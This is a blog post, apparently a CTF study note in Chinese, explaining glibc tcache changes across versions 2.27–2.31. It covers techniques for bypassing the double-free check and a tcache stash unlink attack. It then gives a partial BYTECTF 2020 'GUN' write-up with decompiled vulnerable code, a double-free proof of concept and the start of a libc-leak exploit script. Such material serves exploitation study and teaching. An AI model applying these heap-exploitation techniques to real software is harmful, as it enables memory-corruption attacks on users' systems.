<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>HEAP-2020-姿势学习 | I0gan's blog</title><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script>var config = {"root":"/","path":""}</script><script src="//unpkg.com/mermaid@8.13.5/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/shell/"><span class="navItemTitle">Shell</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>HEAP-2020-姿势学习</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2020-10-28T16:33:26.000Z" id="date"> 2020-10-29</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-04-30T13:59:52.870Z" id="updated"> 2022-04-30</time></div></span><br><span>Word Count: <div class="control">3.9k</div></span><br><span>Read Time: <div class="control">20 min</div></span></div></div><hr><div id="post-content"><h1 id="HEAP-2020-姿势学习"><a href="#HEAP-2020-姿势学习" class="headerlink" title="HEAP-2020-姿势学习"></a>HEAP-2020-姿势学习</h1><p>在2020 10月份的时候，glibc 2.27将更新至2.29一样的特性。</p>
<p>各个hepe的利用方式，很大部分依赖于glibc版本的不同，这里主要讲研究呀下glibc 2.27与2.29以及后续的glibc保护。</p>
<h2 id="Tcache结构"><a href="#Tcache结构" class="headerlink" title="Tcache结构"></a>Tcache结构</h2><h3 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h3><p>2.29版本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>

<p>2.27 老版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct tcache_entry<br>&#123;<br>  struct tcache_entry *next;<br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>

<p>发现-2.29在tcache_entry结构体中加上结构体指针key，该key值为tcache_perthread_struct的地址。</p>
<h3 id="tcache-put-amp-amp-tcache-get"><a href="#tcache-put-amp-amp-tcache-get" class="headerlink" title="tcache_put &amp;&amp; tcache_get"></a>tcache_put &amp;&amp; tcache_get</h3><p>glibc-2.29</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">tcache_put (mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)<br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;	<span class="hljs-comment">//new</span><br><br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br>tcache_get (<span class="hljs-type">size_t</span> tc_idx)<br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;	<span class="hljs-comment">//new</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br><br></code></pre></td></tr></table></figure>



<p>glibc 2.27</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>tcache_put (mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)<br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br>tcache_get (<span class="hljs-type">size_t</span> tc_idx)<br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在将chunk放入tcache之后，会将chunk-&gt;key设置为tcachestruct，即是heap的开头，来表示该chunk已经放入了tcache。而将chunk从tcache取出来后则将chunk-&gt;key设置为NULL清空。 总体上对tcache的改动是在tcacheentry结构指针中增加了一个变量key，来表明该chunk是否处于tcache的状态。</p>
<h2 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h2><p>glibc-2.29</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">&#123;<br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>      &#123;<br>	<span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>	tcache_entry *e = (tcache_entry *) chunk2mem (p);<br><br>	<span class="hljs-comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span><br><span class="hljs-comment">	   trust it (it also matches random payload data at a 1 in</span><br><span class="hljs-comment">	   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span><br><span class="hljs-comment">	   coincidence before aborting.  */</span><br>	<span class="hljs-keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))<br>	  &#123;<br>	    tcache_entry *tmp;<br>	    LIBC_PROBE (memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>	    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<br>		 tmp;<br>		 tmp = tmp-&gt;next)<br>	      <span class="hljs-keyword">if</span> (tmp == e)<br>		malloc_printerr (<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>	    <span class="hljs-comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="hljs-comment">	       few cycles, but don&#x27;t abort.  */</span><br>	  &#125;<br><br>	<span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>	  &#123;<br>	    tcache_put (p, tc_idx);<br>	    <span class="hljs-keyword">return</span>;<br>	  &#125;<br>      &#125;<br> &#125;<br><br><br></code></pre></td></tr></table></figure>



<p>glibc 2.27</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>&#123;<br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache<span class="hljs-comment">//free+172</span><br>        &amp;&amp; tc_idx &lt; mp_.tcache_bins<br>        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>      &#123;<br>        tcache_put (p, tc_idx);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>



<p>glibc-2.29中增加了一个检查：</p>
<p>chunk在放入tcache之前会检查chunk-&gt;key是否为tcache，表示是否已经存在于tcache中，如果已经存在于tcache，则会检查tcache链中是否有跟他相同的堆块。 这对double  free造成了很大的障碍。</p>
<p>常用绕过的一种方法是：如果有存在UFA漏洞或者形成堆重叠等情况，可以修改chunk-&gt;key，使其e-&gt;key !&#x3D; tcache，就可以绕过检查</p>
<h2 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc-2.31"></a>glibc-2.31</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>为了增加安全性，2.29 版本以后的 tcache_entry 结构体发生了变化，增加了 key 字段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>



<p>在 free 的时候多了一段检测</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))<br>&#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE (memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; <span class="hljs-comment">//遍历tcache链子中是否存在</span><br>         tmp;<br>         tmp = tmp-&gt;next)<br>        <span class="hljs-keyword">if</span> (tmp == e)<br>            malloc_printerr (<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br><span class="hljs-comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="hljs-comment">few cycles, but don&#x27;t abort.  */</span><br>&#125;<br></code></pre></td></tr></table></figure>



<p>之后在 tcache_put 函数中多了一段 e-&gt;key&#x3D;tcache 的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br><span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">detect a double free.  */</span><br>    e-&gt;key = tcache;<br>    e-&gt;next = tcache-&gt;entries[tc_idx];<br>    tcache-&gt;entries[tc_idx] = e;<br>    ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>整个流程为：调用 tcache_put 放入 tcache_entry 的时候，其 next  指针和之前变化一致，但是其 key 字段指向了tcache。接下来 free 的时候会检测 key 字段是否为 tcache，如果相等则检测  free 的指针值是否在对应的tcache_entry 链上，如果在则视为程序在 double free，进而终止程序。这里为什么逻辑不是  key 等于 tcache 直接中断，应该是考虑了用户放在 key 字段的数据恰好为 tcache 值的情况。</p>
<p>这种简单的方法使得之前的 tcache 非常随意的 double free 失效了。不过绕过的方式也非常简单，即在构造double free 时提前修改 key 字段的值为任意其他的值。所以相关的所有攻击手法依然可用，并且增加了能够修改key 字段的前提。</p>
<p>还有一个变动就是 tcache 本身的结构体发生了变化：counts 字段由原来的一字节变成了现在的两字节。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint16_t</span> counts[TCACHE_MAX_BINS];<br>    tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br></code></pre></td></tr></table></figure>

<p>这个变动使得一些分析堆利用的 gdb 插件解析出现了一定的错误。</p>
<p><strong>fastbin</strong></p>
<p>fastbin 与 tcache 之间存在一种新的 stash 机制：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">stash them in the tcache.  */</span><br><span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br><span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123;<br>    mchunkptr tc_victim;<br><br><span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>    <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>           &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>            *fb = tc_victim-&gt;fd;<br><span class="hljs-keyword">else</span><br>        &#123;<br>            REMOVE_FB (fb, pp, tc_victim);<br>            <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>        tcache_put (tc_victim, tc_idx);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>当从 fastbin 里取 chunk 时，其余的 chunk 会被依次放入对应的 tcache 中，终止条件时 fastbin 链为空或者 tcache 装满。</p>
<p>其余并无多余变动，要注意做 fastbin 相关利用的时候要先填满对应的 tcache_entry 链。</p>
<p><strong>smallbin</strong></p>
<p>tcache 与 smallbin 之间也增加了 stash 的过程，即向 smallbin 申请的时候，这条 smallbin 链中其余 chunk 会被放到对应 size 的 tcache_entry 链中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br><span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123;<br>    mchunkptr tc_victim;<br><br><span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>    <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>           &amp;&amp; (tc_victim = last (bin)) != bin)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>        &#123;<br>            bck = tc_victim-&gt;bk;<br>            set_inuse_bit_at_offset (tc_victim, nb);<br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                set_non_main_arena (tc_victim);<br>            bin-&gt;bk = bck;<br>            bck-&gt;fd = bin;<br><br>            tcache_put (tc_victim, tc_idx);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>Tache stash unlink</strong> </p>
<p>这种 smallbin 解链方式类似于远古版本的无检测 unlink ，就此也产生了新的利用方式，目前适用于所有带 tcache 的 glibc 版本。</p>
<p>攻击的前提就是得到堆地址，且可以修改 smallbin 中 chunk 的 bk 字段，这里针对不同情况，可以实现三种效果：</p>
<p><strong>Tcache stash unlink attack</strong></p>
<p>该利用方式在祥云杯初赛就遇到过，需要利用该方式将某random key值修改为指定值，类似与unsorted bin 攻击，即向任意地址写入一个不可控的大数字。其最核心操作，就是先放入 2 个 chunk 到 smallbin，6 个 chunk 到对应的 tcache 。之后在不破坏 fd 的情况下将后放入 smallbin 的 chunk 的 bk 设置为目标地址-  0x10 。这样当再向 smallbin 申请对应 size 的 chunk 时（一般用 calloc，因为 calloc 不从tcache分配内存 ），先放入 smallbin 的 chunk 被分配给用户，然后触发 stash 机制。bck &#x3D; tc_victim-&gt;bk; 此时的 bck 就是目标地址-0x10，之后  bck-&gt;fd &#x3D; bin; 也就是*(目标地址-0x10+0x10) &#x3D;  bin，这样就实现了等价于 unsortedbin 的操作。之后调用 tcache_put 把后放入 smallbin 的 chunk  取出给对应的 tcache ，因为 tcache 之前已经被布置了 6 个 chunk ，这次 put 后达到了阈值，所以也就退出了这次  stash 循环，整个流程就可以正常结束了。</p>
<p>glibc 2.29与gilbc 2.31其实利用差不多的，保护检查机制没有增加。</p>
<h2 id="LIBC-2-31利用例子"><a href="#LIBC-2-31利用例子" class="headerlink" title="LIBC-2.31利用例子"></a>LIBC-2.31利用例子</h2><h3 id="BYTECTF-2020-GUN"><a href="#BYTECTF-2020-GUN" class="headerlink" title="BYTECTF-2020-GUN"></a>BYTECTF-2020-GUN</h3><p>下载: </p>
<h4 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h4><p>该题是一个libc-2.31的利用, 且开启了沙箱, 只能orw</p>
<h4 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __usercall shoot@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;)<br>&#123;<br>  __int64 v2; <span class="hljs-comment">// rsi</span><br>  __int64 v3; <span class="hljs-comment">// rdi</span><br>  __int64 v4; <span class="hljs-comment">// ST08_8</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp-18h] [rbp-18h]</span><br>  __int64 idx; <span class="hljs-comment">// [rsp-14h] [rbp-14h]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp-8h] [rbp-8h]</span><br><br>  __asm &#123; endbr64 &#125;<br>  v7 = a1;<br>  <span class="hljs-keyword">if</span> ( !loaded_arr ) <span class="hljs-comment">// 检查是否存在bullet, 然而在释放完毕后也没有对loaded_arr进行清0</span><br>    <span class="hljs-keyword">return</span> puts_0(<span class="hljs-string">&quot;No bullet!&quot;</span>);<br>  sub_1140();<br>  idx = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)input_n((__int64)&amp;v7);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; loaded_arr &amp;&amp; i &lt; (<span class="hljs-type">signed</span> <span class="hljs-type">int</span>)idx; ++i )<br>  &#123;<br>    v2 = *(_QWORD *)loaded_arr;<br>    sub_1140();<br>    v3 = *(_QWORD *)loaded_arr;<br>    sub_1100();<br>    v4 = loaded_arr;<br>    loaded_arr = *(_QWORD *)(loaded_arr + <span class="hljs-number">8</span>);   <span class="hljs-comment">// vul: not set loaded_arr as null, just move next ptr to this</span><br>    *(_QWORD *)(v4 + <span class="hljs-number">16</span>) = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  sub_159A();<br>  <span class="hljs-keyword">return</span> sub_1140();<br>&#125;<br><br>__int64 __usercall load@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;)<br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp-10h] [rbp-10h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp-8h] [rbp-8h]</span><br><br>  __asm &#123; endbr64 &#125;<br>  v3 = a1;<br>  sub_1140();<br>  v2 = input_n((__int64)&amp;v3);<br>  <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0xD</span> || ptr_arr_flag[<span class="hljs-number">3</span> * v2] == <span class="hljs-number">0LL</span> || ptr_arr_flag[<span class="hljs-number">3</span> * v2] == <span class="hljs-number">2LL</span> )<br>    <span class="hljs-keyword">return</span> puts_0(<span class="hljs-string">&quot;what??&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( loaded_arr ) <span class="hljs-comment">// vul, 不为0时, 直接</span><br>    *((_QWORD *)&amp;unk_4068 + <span class="hljs-number">3</span> * v2) = loaded_arr;<br>  loaded_arr = (__int64)&amp;unk_4060 + <span class="hljs-number">0x18</span> * v2;<br>  *((_QWORD *)&amp;unk_4060 + <span class="hljs-number">3</span> * v2 + <span class="hljs-number">2</span>) = <span class="hljs-number">2LL</span>;<br>  <span class="hljs-keyword">return</span> puts_0(<span class="hljs-string">&quot;Confirm.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在进行shoot的时候, 只是对loaded_arr设置为下一个数据指针, 并没有清0, 若下一个数据指针已经被释放, 即可造成double free</p>
<p>double free poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;I0gan&#x27;</span>)<br><br>buy(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;E&#x27;</span> * <span class="hljs-number">8</span> + <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 0</span><br>buy(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;F&#x27;</span> * <span class="hljs-number">8</span> + <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 1</span><br>load(<span class="hljs-number">1</span>)<br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">2</span>)<br><br>buy(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;G&#x27;</span> * <span class="hljs-number">8</span> + <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 1</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>

<p>先泄漏libc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br><span class="hljs-comment"># leak libc</span><br>sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;I0gan&#x27;</span>)<br>buy(<span class="hljs-number">0x450</span>, <span class="hljs-string">&#x27;X&#x27;</span> * <span class="hljs-number">0x10</span> + <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 0</span><br>buy(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">8</span> + <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 1</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br>buy(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;X&#x27;</span> * <span class="hljs-number">8</span> +<span class="hljs-string">&#x27;\n&#x27;</span>); <span class="hljs-comment"># 0</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br>libc_base = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>) - <span class="hljs-number">0x1ebf80</span> - <span class="hljs-number">96</span><br>li(<span 